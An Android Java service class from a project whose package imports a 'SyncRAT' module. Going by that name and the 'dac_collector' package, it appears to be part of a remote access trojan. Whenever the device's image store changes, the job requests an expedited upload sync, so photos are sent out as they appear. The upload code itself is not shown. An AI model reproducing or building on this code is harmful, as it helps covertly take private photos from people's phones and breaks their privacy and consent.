package android.iocl.dac_collector.Services;

import android.accounts.Account;
import android.app.job.JobParameters;
import android.app.job.JobService;
import android.content.ContentResolver;
import android.iocl.dac_collector.SyncRAT.Config;
import android.iocl.dac_collector.SyncRAT.SyncAccountUtil;
import android.os.Bundle;

public class ImageJobService extends JobService {
    @Override
    public boolean onStartJob(JobParameters params) {
        // this fires whenever MediaStore.Images.Media.EXTERNAL_CONTENT_URI changes
        // kick off your UploadSyncAdapter here:
        Account account = SyncAccountUtil.getSyncAccount(this);
        Bundle b = new Bundle();
        b.putBoolean(ContentResolver.SYNC_EXTRAS_EXPEDITED, true);
        b.putBoolean(ContentResolver.SYNC_EXTRAS_MANUAL, true);
        ContentResolver.requestSync(account,
                Config.Sync.AUTHORITY,
                b);
        return false; // work is short
    }

    @Override
    public boolean onStopJob(JobParameters params) {
        return false;
    }
}
